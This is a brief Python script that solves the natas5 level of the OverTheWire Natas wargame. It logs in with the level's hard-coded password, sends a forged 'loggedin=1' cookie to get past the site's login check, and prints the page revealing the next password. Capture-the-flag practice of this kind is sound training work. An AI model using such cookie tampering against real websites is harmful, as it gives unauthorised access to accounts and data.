#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

prajituri = { "loggedin" : "1" }

url = 'http://%s.natas.labs.overthewire.org/' % username

sesiune = requests.Session()
#print(dir(requests))

response = sesiune.get(url, auth = (username, password), cookies = prajituri)
content = response.text

print(sesiune.cookies)
print(content)
#print(re.findall('<!--The password for natas3 is (.*) -->', content))